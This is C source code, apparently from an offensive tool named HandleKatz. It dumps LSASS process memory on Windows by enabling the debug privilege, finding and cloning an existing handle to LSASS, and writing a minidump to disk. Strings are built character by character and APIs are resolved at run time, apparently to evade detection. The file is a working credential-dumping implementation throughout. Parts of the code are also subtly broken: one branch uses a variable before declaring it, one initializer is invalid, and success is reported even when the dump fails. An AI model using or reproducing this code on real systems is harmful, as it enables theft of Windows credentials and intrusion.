#include "windows.h"

#include "APIResolve.h"
#include "DumpTools.h"
#include "HandleTools.h"
#include "Misc.h"
#include "syscalls.h"

DWORD dump(DWORD, char*, char*, struct fPtrs*);
DWORD recon(char*, struct fPtrs*);

#ifdef ENCODE

DWORD 
handleKatz(void) {
    BOOL b_only_recon = false;
    char* ptr_output_path = {'C' ...};
    uint32_t pid = 1337;

   char *ptr_buf_output = (char*)ptrs_functions._VirtualAlloc(0, 0x4096, MEM_COMMIT, PAGE_READWRITE);
    if(ptr_buf_output == NULL)
        goto cleanup;

#else
DWORD
handleKatz(BOOL b_only_recon, char* ptr_output_path, uint32_t pid, char* ptr_buf_output) {
#endif

    struct fPtrs ptrs_functions = { 0 };
    DWORD dw_success = FAIL;

    dw_success = resolveFptrs(&ptrs_functions);
    if (dw_success == FAIL) {
        goto cleanup;
    }

    dw_success = setDebugPrivilege(&ptrs_functions);
    if (dw_success == FAIL) {
        char msg_no_admin[] = { '[','-',']',' ','C','o','u','l','d',' ','n','o','t',' ','e','n','a','b','l','e',' ','D','e','b','u','g',' ','p','r','i','v','i','l','e','g','e','\n', 0x00 };
        ptrs_functions._lstrcatA((char*)ptr_buf_output, msg_no_admin);
        goto cleanup;
    }

    if (b_only_recon) {

        char msg_do_recon[] = { '[','*',']',' ','C','h','e','c','k','i','n','g',' ','f','o','r',' ','p','r','o','c','e','s','s','e','s',' ','w','i','t','h',' ','a',' ','s','u','i','t','a','b','l','e',' ','h','a','n','d','l','e',' ','t','o',' ','l','s','a','s','s',' ','.','.','.',' ','\n', 0x00 };
        ptrs_functions._lstrcatA((char*)ptr_buf_output, msg_do_recon);

        dw_success = recon((char*)ptr_buf_output, &ptrs_functions);

    } else {

        char msg_attempting_clone[] = { '[','*',']',' ','A','t','t','e','m','p','t','i','n','g',' ','t','o',' ','c','l','o','n','e',' ','l','s','a','s','s',' ','h','a','n','d','l','e',' ','f','r','o','m',' ','p','i','d',':',' ','%','d','\n', 0x00};
        char msg_outfile[] = { '[','*',']',' ','O','u','t','f','i','l','e',':',' ','%','s','\n', 0x00};

        char line[512] = { 0x00 };
        char line_1[512] = { 0x00 };

        ptrs_functions._wsprintfA(line, msg_attempting_clone, pid);
        ptrs_functions._wsprintfA(line_1, msg_outfile, ptr_output_path);

        ptrs_functions._lstrcatA((char*)ptr_buf_output, line);
        ptrs_functions._lstrcatA((char*)ptr_buf_output, line_1);

        dw_success = dump(pid, (char*)ptr_buf_output, ptr_output_path, &ptrs_functions);

    }

    dw_success = SUCCESS;

cleanup:
	
	return dw_success;

}

DWORD
dump(DWORD pid, char* ptr_output, char* outpath, struct fPtrs* ptrs_functions) {

    HANDLE h_lsass = NULL, h_f_dump = NULL;
    DWORD dw_pid_lsass = 0x00, dw_success = FAIL;
    PSYSTEM_HANDLE_INFORMATION handle_info = NULL;

    handle_info = get_handles(ptrs_functions);
    if (handle_info == NULL) {
        char msg_failed_retrieve_handles[] = { '[','-',']',' ','F','a','i','l','e','d',' ','t','o',' ','g','e','t',' ','a',' ','l','i','s','t',' ','o','f',' ','h','a','n','d','l','e','s','\n', 0x00 };
        ptrs_functions->_lstrcatA(ptr_output, msg_failed_retrieve_handles);
        goto cleanup;
    }

    h_lsass = check_handles(handle_info, pid, ptr_output, ptrs_functions);
    if (h_lsass == NULL) {
        char msg_could_not_find_handle[] = { '[','-',']',' ','C','o','u','l','d',' ','n','o','t',' ','f','i','n','d',' ','a','p','p','r','o','p','r','i','a','t','e',' ','h','a','n','d','l','e',' ','i','n',' ','g','i','v','e','n',' ','p','i','d','\n', 0x00};
        ptrs_functions->_lstrcatA(ptr_output, msg_could_not_find_handle);
        goto cleanup;
    }

    char msg_dumping[] = { '[','*',']',' ','N','o','w',' ','t','r','y','i','n','g',' ','t','o',' ','d','u','m','p',' ','l','s','a','s','s',' ','.','.','.',' ','\n', 0x00};
    ptrs_functions->_lstrcatA(ptr_output, msg_dumping);

    h_f_dump = ptrs_functions->_CreateFileA(outpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_f_dump == INVALID_HANDLE_VALUE) {
        char msg_file_error[] = { '[','-',']',' ','C','o','u','l','d',' ','n','o','t',' ','w','r','i','t','e',' ','t','o',' ','s','p','e','c','i','f','i','e','d',' ','o','u','t','p','u','t','f','i','l','e','\n', 0x00};
        ptrs_functions->_lstrcatA(ptr_output, msg_file_error);
        goto cleanup;
    }

    dw_pid_lsass = ptrs_functions->_GetProcessId(h_lsass);
    dw_success = MiniDumpWriteDumpA(h_lsass, dw_pid_lsass, h_f_dump, ptrs_functions);

    if (dw_success == FAIL) {
        char msg_dump_fail[] = { '[','-',']',' ','S','o','m','e','t','h','i','n','g',' ','w','e','n','t',' ','w','r','o','n','g',' ','w','h','i','l','e',' ','d','u','m','p','i','n','g','\n', 0x00 };
        ptrs_functions->_lstrcatA(ptr_output, msg_dump_fail);
        goto cleanup;
    }

    char msg_complete[] = { '[','+',']',' ','L','s','a','s','s',' ','d','u','m','p',' ','i','s',' ','c','o','m','p','l','e','t','e','\n', 0x00};
    ptrs_functions->_lstrcatA(ptr_output, msg_complete);

    dw_success = SUCCESS;

cleanup:

    if (h_f_dump)
        ptrs_functions->_CloseHandle(h_f_dump);

    if (h_lsass)
        ptrs_functions->_CloseHandle(h_lsass);

    if (handle_info != NULL)
        ptrs_functions->_VirtualFree(handle_info, 0, MEM_RELEASE);

    return dw_success;

}


DWORD
recon(char* ptr_output, struct fPtrs* ptrs_functions) {

    PSYSTEM_HANDLE_INFORMATION handle_info = NULL;
    DWORD dw_success = FALSE;

    handle_info = get_handles(ptrs_functions);
    if (handle_info == NULL) {

        char msg_failed_retrieve_handles[] = { '[','-',']',' ','F','a','i','l','e','d',' ','t','o',' ','g','e','t',' ','a',' ','l','i','s','t',' ','o','f',' ','h','a','n','d','l','e','s','\n', 0x00};
        ptrs_functions->_lstrcatA(ptr_output, msg_failed_retrieve_handles);
        goto cleanup;

    }

    check_handles(handle_info, 0, ptr_output, ptrs_functions);

    dw_success = SUCCESS;

cleanup:

    if (handle_info != NULL)
        ptrs_functions->_VirtualFree(handle_info, 0, MEM_RELEASE);

    return dw_success;

}

